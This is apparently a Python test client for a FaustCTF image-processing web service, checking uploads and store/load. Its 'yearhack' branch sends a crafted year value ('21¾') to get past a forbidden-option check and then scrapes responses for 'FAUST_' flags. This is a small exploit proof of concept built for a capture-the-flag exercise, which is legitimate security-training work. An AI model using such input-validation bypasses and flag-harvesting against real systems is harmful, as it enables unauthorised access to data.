import sys
import requests
import subprocess
import re
import random
from PIL import Image

# just to test the web app functionality
# USAGE: <op> <file>

urlLocal='[::1]'
urlRemote='[fd66:666:995::2]'
url = urlRemote # Local
port=8574
noShow = False

def testImage(opString, inFile, outFile):
	print("Testing {} with operations {}".format(inFile, opString))
	files={'file': open(inFile,'rb')}
	data={'operation': opString}

	f = requests.post("http://{}:{}/upload".format(url, port), files=files, data=data)
	ref = open(outFile, 'rb').read()
	assert ref == f.content, "Exp: {}\nGot: {}".format(ref[:100], f.content[:100])

def fullTest():
	global url
	if sys.argv[2] == "local":
		url = urlLocal
	else:
		url = urlRemote

	# Store / Load
	print("Storing data ...")
	value = "rndString" + str(random.randint(0, 100000))
	f = requests.post("http://{}:{}/store".format(url, port), data={'value': value})
	key = f.content.decode('utf-8', errors="ignore").strip()
	assert len(key) == 32, key
	print("Loading data ...")
	f = requests.post("http://{}:{}/load".format(url, port), data={'key': key})
	value2 = f.content.decode('utf-8', errors="ignore").strip()
	assert value2 == value

	print("Some normal images ...")
	testImage("1 1", "faustctf.ppm", "faustctf_1.ppm")
	testImage("1 2", "faustctf.ppm", "faustctf_2.ppm")
	testImage("1 3", "faustctf.ppm", "faustctf_3.ppm")
	testImage("1 4", "faustctf.ppm", "faustctf_4.ppm")
	testImage("1 5", "faustctf.ppm", "faustctf_5.ppm")
	testImage("1 6", "faustctf.ppm", "faustctf_6.ppm")
	testImage("3 1 1 1", "faustctf.ppm", "faustctf_111.ppm")
	testImage("3 3 3 3", "faustctf.ppm", "faustctf_333.ppm")
	testImage("2 1 5", "faustctf.ppm", "faustctf_15.ppm")
	testImage("3 1 2 6", "faustctf.ppm", "faustctf_126.ppm")


ic = 1
if sys.argv[ic] == "--no-show":
	noShow = True
	ic += 1

if sys.argv[ic] == "test":
	fullTest()
elif sys.argv[ic] == "db":
	ic += 1
	if sys.argv[ic] == "store":
		value = sys.argv[ic+1]
		f = requests.post("http://{}:{}/store".format(url, port), data={'value': value})
		c = f.content.decode('utf-8', errors="ignore")
		print(c)
	elif sys.argv[ic] == "load":
		key = sys.argv[ic+1]
		f = requests.post("http://{}:{}/load".format(url, port), data={'key': key})
		c = f.content.decode('utf-8', errors="ignore")
		print(c)
else:
	if sys.argv[ic] == "normal":
		files={'file': open(sys.argv[ic+2],'rb')}
		data={'operation': sys.argv[ic+1]}

		f = requests.post("http://{}:{}/upload".format(url, port), files=files, data=data)
	elif sys.argv[ic] == "year21": # shoul be forbidden
		files={'file': open(sys.argv[ic+2],'rb')}
		data={'operation': sys.argv[ic+1], 'year': "21"}

		f = requests.post("http://{}:{}/upload".format(url, port), files=files, data=data)
	elif sys.argv[ic] == "yearhack": # should suceed
		files={'file': open(sys.argv[ic+2],'rb')}
		data={'operation': sys.argv[ic+1], 'year': "21¾"}

		f = requests.post("http://{}:{}/upload".format(url, port), files=files, data=data)

	c = f.content.decode('utf-8', errors="ignore")
	ai = c.find("FAUST_")
	if ai != -1:
		matches = re.findall(r"FAUST_[^,]{32}", c)
		print("FOUND FLAGS: ")
		for m in matches:
			print(m)
	elif "failed" in c:
		print(c)
	else:
		with open("/tmp/img.ppm", "wb") as outf:
			outf.write(f.content)
		if not noShow:
			image = Image.open('/tmp/img.ppm')
			image.show()

